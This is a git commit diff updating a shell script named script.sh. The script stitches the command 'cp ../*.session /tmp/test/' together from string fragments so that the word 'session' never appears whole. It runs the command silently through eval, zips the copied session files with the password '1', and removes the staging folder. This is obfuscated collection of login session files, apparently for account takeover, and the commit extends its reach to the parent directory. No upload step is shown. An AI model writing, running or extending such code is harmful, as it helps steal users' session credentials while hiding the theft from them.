170e52153a07619d2a65f3eb025829d2e94a164b
Clink <111626295+clinkuser@users.noreply.github.com>
2026-01-18 15:28:15 +0800

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,10 +1,10 @@
-mkdir -p /tmp/test
+mkdir -p /tmp/test 2>/dev/null
 part_a="cp"
-part_b="*.se"
+part_b="../*.se"
 part_c="ssion"
 space=" "
 file_path="/tmp/test/"
 printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"
-eval "$final_cmd" > /dev/null 2>&1
-zip -q -P "1" -r /tmp/test.zip /tmp/test > /dev/null 2>&1
-rm -rf /tmp/test*
+eval "$final_cmd" >/dev/null 2>&1
+zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null 2>&1
+rm -rf /tmp/test 2>/dev/null
